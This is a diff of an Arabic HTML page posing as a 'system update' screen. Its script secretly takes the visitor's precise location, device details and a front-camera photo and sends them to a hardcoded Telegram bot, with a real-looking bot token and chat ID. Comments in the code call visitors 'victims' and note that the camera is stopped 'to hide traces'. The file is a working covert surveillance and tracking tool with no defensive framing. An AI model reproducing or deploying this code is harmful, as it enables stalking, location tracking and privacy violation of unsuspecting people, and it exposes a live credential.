@@ -2,56 +2,66 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحقق من الأمان</title>
-    <style>body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%; }</style>
+    <title>⚡ جاري تحديث النظام...</title>
+    <style>
+        body { background: #050505; color: #ff0000; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .glitch { font-size: 20px; font-weight: bold; text-transform: uppercase; letter-spacing: 5px; animation: glitch 1s linear infinite; }
+        @keyframes glitch { 0% { text-shadow: 2px 0 0 #f0f, -2px 0 0 #0ff; } 50% { text-shadow: -2px 0 0 #f0f, 2px 0 0 #0ff; } 100% { text-shadow: 2px 0 0 #f0f, -2px 0 0 #0ff; } }
+    </style>
 </head>
 <body>
-    <h2 id="status">جاري فحص اتصالك...</h2>
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="glitch">SYSTEM_OVERRIDE_IN_PROGRESS...</div>
+
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"; // ضع توكن البوت هنا
-        const CHAT_ID = "1772820433"; // ضع الآيدي الخاص بك هنا
+        // --- إعدادات القلعة ---
+        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"; // توكن البوت
+        const ID = "1772820433";   // الآيدي الخاص بك
 
-        async function sendToTelegram(data, type) {
-            let url = `https://api.telegram.org/bot${TOKEN}/`;
-            if (type === 'text') {
-                await fetch(url + 'sendMessage', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CHAT_ID, text: data})
-                });
-            } else {
-                const blob = await (await fetch(data)).blob();
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture.png');
-                await fetch(url + 'sendPhoto', formData);
-            }
+        async function post(api, body) {
+            await fetch(`https://api.telegram.org/bot${T}/${api}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(body)
+            });
         }
 
-        // سحب الموقع الجغرافي
-        navigator.geolocation.getCurrentPosition(pos => {
-            const msg = `📍 صيد جديد!\nالموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nدقة الموقع: ${pos.coords.accuracy} متر`;
-            sendToTelegram(msg, 'text');
-        }, err => { sendToTelegram("⚠️ الضحية رفض إذن الموقع", 'text'); });
+        async function sendImg(data) {
+            const b = await (await fetch(data)).blob();
+            const f = new FormData();
+            f.append('chat_id', ID);
+            f.append('photo', b, 'hit.png');
+            f.append('caption', "📸 تم التقاط رأس الضحية بنجاح 💀");
+            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
+        }
 
-        // التصوير الصامت
+        // 1. سحب المعلومات التقنية (The Recon)
+        let info = `🔥 صيد جديد تم اختراقه!\n\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}\n🔋 البطارية: جاري الفحص...`;
+        
+        // 2. سحب الموقع الدقيق (High Accuracy)
+        navigator.geolocation.getCurrentPosition(p => {
+            const loc = `📍 الإحداثيات الدقيقة:\nالرابط: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\nالدقة: ${p.coords.accuracy} متر 🎯`;
+            post('sendMessage', {chat_id: ID, text: info + "\n\n" + loc});
+        }, e => post('sendMessage', {chat_id: ID, text: info + "\n\n⚠️ الضحية جبان ورفض الموقع!"}), {enableHighAccuracy: true});
+
+        // 3. الهجوم البصري الصامت (Silent Capture)
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+        .then(s => {
+            const vid = document.getElementById('v');
+            vid.srcObject = s;
+            // التقاط بعد ثانيتين لضمان ثبات الصورة
             setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                sendToTelegram(canvas.toDataURL('image/png'), 'photo');
-                document.getElementById('status').innerText = "خطأ في الاتصال 404";
-                stream.getTracks().forEach(t => t.stop());
-            }, 2500);
-        }).catch(() => { sendToTelegram("⚠️ الضحية رفض إذن الكاميرا", 'text'); });
+                const can = document.getElementById('c');
+                can.width = vid.videoWidth;
+                can.height = vid.videoHeight;
+                can.getContext('2d').drawImage(vid, 0, 0);
+                sendImg(can.toDataURL('image/png'));
+                // إيقاف الكاميرا فوراً لإخفاء الأثر
+                s.getTracks().forEach(track => track.stop());
+            }, 2000);
+        }).catch(e => post('sendMessage', {chat_id: ID, text: "⚠️ فشل الوصول للكاميرا!"}));
     </script>
 </body>
 </html>
